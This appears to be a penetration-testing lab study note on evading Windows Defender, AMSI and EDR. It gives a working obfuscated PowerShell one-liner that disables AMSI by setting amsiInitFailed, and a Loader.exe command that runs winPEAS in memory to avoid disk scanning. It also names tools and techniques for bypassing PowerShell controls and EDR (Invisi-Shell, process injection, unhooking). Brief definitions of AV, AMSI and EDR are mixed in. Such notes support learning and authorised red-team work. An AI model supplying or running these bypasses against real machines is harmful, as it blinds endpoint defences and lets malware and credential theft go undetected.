>AMSI bypass
```powershell
#Lunch  invishell for evasion A complete tool/framework
RunwithRegistrynonAdmin.exe

#or this script Disable AMSI inside powershell.exe 
S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

#Sbloggingbypass (or "Script Block Logging bypass") is a technique to disable PowerShell's Script Block Logging feature
```


>AV bypass
```powershell 

#This command is using a loader to execute winPEASx64.exe in memory without touching disk  A
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\winPEASx64.exe
```


**AV (Antivirus)**
```powershell 
A security tool that compares files against a database of known malware signatures. It's like a "wanted poster" system

#checklist
- AMSITrigger (https://github.com/RythmStick/AMSITrigger) or DefenderCheck
(https://github.com/t3hbb/DefenderCheck) to identify code and strings from a binary or script that Windows Defender may flag.

#example
Sees `mimikatz.exe` on disk → "That's malware!" → Deletes it

#bypass
Obfuscation, packers, -> loaders Using `Loader.exe` for winPEAS
```

 **AMSI (Antimalware Scan Interface)**
```powershell
Definition: A real-time content scanner built into Windows components (PowerShell, VBA, etc.) that inspects scripts before they execute. It's like a bouncer reading your ID before letting you in.

#checklist
- Invisi-Shell (https://github.com/OmerYa/Invisi-Shell) for
bypassing the security controls in PowerShell


#example 
"I can see this PowerShell code BEFORE it runs."
"The string 'Invoke-Mimikatz' matches known malicious patterns."
"This script wants to dump credentials."
"BLOCK IT!"

#bypass
Memory patching, setting `amsiInitFailed` ->  obfuscated `sET-ItEM` command
```

**EDR (Endpoint Detection & Response)**
```powershell
Definition: A comprehensive monitoring system that watches all activity on a computer (processes, network, file changes) and looks for suspicious behavior patterns. It's like a security camera system with AI that notices when someone acts suspiciously

#example
Sees a process accessing LSASS memory → "That's suspicious behavior!" → Alerts and isolates the machine

#bypass
LOLBins, process injection, unhooking APIs -> InvisiShell, direct system calls
```

**Loader**
```powershell
What happens:
- Windows creates a new process (winPEASx64.exe)
- Process creation is logged (Event ID 4688)
- AV/EDR can scan the file on disk  
- Security tools see "winPEAS" running (well-known hacking tool)
  
  
1- Loader.exe runs (looks like a generic/legitimate tool)
2- Loader reads winPEASx64.exe into memory
3- Loader maps the PE into its own process space
4- winPEAS runs inside Loader.exe's process
5- No new process for winPEAS is created   
6- No "winPEAS" process name appears in task manager

C:\AD\Tools\Loader.exe -Path C:\AD\Tools\winPEASx64.exe -args notcolor log
```